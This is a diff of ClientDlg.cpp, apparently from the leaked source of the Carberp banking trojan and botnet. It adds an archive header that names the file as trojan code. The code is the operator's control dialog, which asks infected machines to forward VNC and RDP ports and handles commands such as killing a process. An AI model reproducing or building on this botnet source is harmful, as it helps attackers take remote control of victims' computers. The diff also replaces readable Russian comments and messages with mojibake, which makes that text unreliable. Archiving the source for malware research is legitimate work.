@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 // ClientDlg.cpp : implementation file
 //
 #include "stdafx.h"
@@ -113,7 +124,7 @@ BEGIN_MESSAGE_MAP(CClientDlg, CDialog)
 	ON_MESSAGE(PM_Client_PATCHDATA_VNC,OnClientVLC)
 
 	ON_MESSAGE(PM_CLIENT_PATCH_INFO,OnPatchInfoReceived)
-	ON_MESSAGE(PM_CLIENT_PATCH_INFO,OnKillProces)// замочили поток
+	ON_MESSAGE(PM_CLIENT_PATCH_INFO,OnKillProces)// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	ON_BN_CLICKED(IDC_REFRESH_BTN, &CClientDlg::OnBnClickedRefreshBtn)
 	ON_WM_SIZE()
 	ON_WM_SIZING()
@@ -241,8 +252,8 @@ void CClientDlg::OnOK()
 BOOL CClientDlg::OnInitDialog()
 {
 	CDialog::OnInitDialog();
-// 0 полная версия
-// 1 урезанная
+// 0 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+// 1 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #define FullVersion
 #define NoHideJava
 #ifdef FullVersion
@@ -530,12 +541,12 @@ LRESULT CClientDlg::OnClientVLC( WPARAM wp, LPARAM lp )
 	/*Sleep(3*1000);
 	int port = m_pClient->RequestPortForw( 5900);
 	if( port == 0 )
-		::MessageBox( 0, L"Не удалось выделить порт", L"Ошибка", 0 );
+		::MessageBox( 0, L"пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ", L"пїЅпїЅпїЅпїЅпїЅпїЅ", 0 );
 	else
 	{
 		WCHAR buf[100];
-		wsprintf( buf, L"Открыт порт: %d", port );
-		::MessageBox( 0, buf, L"Сообщение", 0 );
+		wsprintf( buf, L"пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: %d", port );
+		::MessageBox( 0, buf, L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", 0 );
 	}*/
 	Log( L"OnClientVLC" );
 
@@ -546,12 +557,12 @@ LRESULT CClientDlg::OnClientRDP( WPARAM wp, LPARAM lp )
 	/*Sleep(3*1000);
 	int port = m_pClient->RequestPortForw( 3389);
 	if( port == 0 )
-		::MessageBox( 0, L"Не удалось выделить порт", L"Ошибка", 0 );
+		::MessageBox( 0, L"пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ", L"пїЅпїЅпїЅпїЅпїЅпїЅ", 0 );
 	else
 	{
 		WCHAR buf[100];
-		wsprintf( buf, L"Открыт порт: %d", port );
-		::MessageBox( 0, buf, L"Сообщение", 0 );
+		wsprintf( buf, L"пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: %d", port );
+		::MessageBox( 0, buf, L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", 0 );
 	}*/
 	Log( L"OnClientRDP" );
 	//OnRdpPortforw();
@@ -1334,12 +1345,12 @@ void CClientDlg::OnRdpPortforw()
 
 		int port = m_pClient->RequestPortForw(pWind.Port);
 		if( port == 0 )
-			::MessageBox( 0, L"Не удалось выделить порт", L"Ошибка", 0 );
+			::MessageBox( 0, L"пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ", L"пїЅпїЅпїЅпїЅпїЅпїЅ", 0 );
 		else
 		{
 			WCHAR buf[100];
-			wsprintf( buf, L"Открыт порт: %d", port );
-			::MessageBox( 0, buf, L"Сообщение", 0 );
+			wsprintf( buf, L"пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: %d", port );
+			::MessageBox( 0, buf, L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", 0 );
 		}
 	}
 }
@@ -1367,12 +1378,12 @@ void CClientDlg::OnPortforwardingVnc()
 {
 	int port = m_pClient->RequestPortForw(5900);
 		if( port == 0 )
-			::MessageBox( 0, L"Не удалось выделить порт", L"Ошибка", 0 );
+			::MessageBox( 0, L"пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ", L"пїЅпїЅпїЅпїЅпїЅпїЅ", 0 );
 		else
 		{
 			WCHAR buf[100];
-			wsprintf( buf, L"Открыт порт: %d", port );
-			::MessageBox( 0, buf, L"Сообщение", 0 );
+			wsprintf( buf, L"пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: %d", port );
+			::MessageBox( 0, buf, L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", 0 );
 		}
 }
 
@@ -1380,12 +1391,12 @@ void CClientDlg::OnPortforwardingRdp()
 {
 	int port = m_pClient->RequestPortForw(3389);
 		if( port == 0 )
-			::MessageBox( 0, L"Не удалось выделить порт", L"Ошибка", 0 );
+			::MessageBox( 0, L"пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ", L"пїЅпїЅпїЅпїЅпїЅпїЅ", 0 );
 		else
 		{
 			WCHAR buf[100];
-			wsprintf( buf, L"Открыт порт: %d", port );
-			::MessageBox( 0, buf, L"Сообщение", 0 );
+			wsprintf( buf, L"пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: %d", port );
+			::MessageBox( 0, buf, L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", 0 );
 		}
 }
 
